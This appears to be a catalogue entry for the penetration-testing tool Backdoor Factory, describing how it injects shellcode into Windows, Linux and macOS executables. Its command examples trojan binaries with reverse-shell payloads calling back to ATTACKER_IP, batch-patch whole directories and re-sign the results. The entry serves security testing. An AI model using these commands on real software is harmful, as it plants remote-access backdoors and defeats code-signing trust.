---
name: "backdoor-factory"
categories:
  - blackarch-backdoor
version: "210.0c53045"
homepage: "https://github.com/secretsquirrel/the-backdoor-factory"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: BSD
meta-checked: "2026-11-09"
github-repo: "secretsquirrel/the-backdoor-factory"
github-stars: 3445
github-pushed: "2023-10-30"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# backdoor-factory

> Patch existing Windows PE, Linux ELF and Mach-O binaries with shellcode while preserving their normal behaviour.

## What it's for

The Backdoor Factory (BDF) takes an already-working executable and injects attacker-supplied shellcode into it, so the payload fires when the trojaned binary runs and the original program then resumes as if nothing happened. It locates unused space ("code caves") in the target binary, or creates a new section, writes the shellcode there and rewrites the entry point to jump through it. Supported formats include Windows PE x86/x64 (also UPX-packed), ELF x86/x64 (System V, FreeBSD, ARM LE), Mach-O x86/x64, and those formats inside FAT files. Reach for it when a simulation needs a legitimately-looking binary to carry an implant; it does not exploit anything itself, and binaries with built-in protections (bound imports, some installers) may refuse to patch, so test on a copy first.

## Typical use cases

### Backdoor a single PE using an existing code cave

Trojan a Windows binary by hiding the shellcode in space already present inside it.

```
./backdoor.py -f tool.exe -H ATTACKER_IP -P 8080 -s reverse_shell_tcp
```

Outcome: BDF enumerates every code cave large enough for the chosen shellcode and prompts for one interactively; on completion the patched copy is written to the `backdoored/` directory and the PE certificate-table pointer is cleared (the output binary is unsigned).

### Add a new section when no cave fits

Force injection space instead of hunting for caves.

```
./backdoor.py -f tool.exe -H ATTACKER_IP -P 8080 -s reverse_shell_tcp -a
```

Outcome: BDF appends a new section to the PE, moves the shellcode there and patches the entry point — no interactive cave selection, and the trojaned file lands in `backdoored/`.

### Embed your own shellcode

Use shellcode from any generator instead of BDF's built-in payloads.

```
./backdoor.py -f tool.exe -s user_supplied_shellcode -U payload.bin
```

Outcome: the raw shellcode bytes from `payload.bin` are patched into the binary exactly like a built-in payload would be.

### Batch-patch a directory of executables

Trojan many binaries in one run.

```
./backdoor.py -d fatools/ -i ATTACKER_IP -p 8080 -s reverse_shell_tcp -a
```

Outcome: every supported executable under `fatools/` is patched with the same reverse-shell payload (new-section mode) and collected in `backdoored/`.

### Automatic patching with IAT payload and code signing

Skip cave selection entirely and re-sign the output with your own certificate.

```
./backdoor.py -f tool.exe -s iat_reverse_tcp_inline -H ATTACKER_IP -P 8080 -m automatic -C
```

Outcome: `-m automatic` picks suitable caves without prompting, the IAT-based payload resolves its API calls through the import table, and — with `certs/signingCert.cer` and `certs/signingPrivateKey.pem` in place — the output is signed (`[*] Code Signing Succeeded`).

*No corpus evidence — derived from upstream documentation.*
